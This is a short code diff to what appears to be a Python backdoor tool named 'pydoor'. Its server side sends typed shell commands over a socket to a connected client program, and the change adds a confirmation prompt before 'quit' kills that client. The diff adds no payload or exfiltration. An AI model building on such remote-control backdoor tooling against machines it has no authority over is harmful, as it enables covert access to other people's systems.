@@ -27,6 +27,8 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
         
         """
 
+        self.quitwarning = """WARNING : Running quit will kill the client program, proceed ? [Y/n]: """
+
     def handle_response(self, resp):
         if "pydoor.quit" in resp:
             print("Quit signal received from client " + self.host)
@@ -50,6 +52,14 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
         if self.cmd == "shellhelp":
             print(self.usage)
             return 1
+
+        elif self.cmd == "quit":
+            choice =  input(self.quitwarning)
+
+            if choice.lower() == "y" or choice.lower() == "yes":
+                return 0
+            else:
+                return 1
         
         else:
             return 0
@@ -88,7 +98,6 @@ setshell [absolute/path/to/shell] | Change the shell that the integrated shell w
                         self.con.send(self.cmd.encode())
                         dat = self.recvall().decode()
                         self.handle_response(dat.rstrip())
-
                     else:
                         pass
 
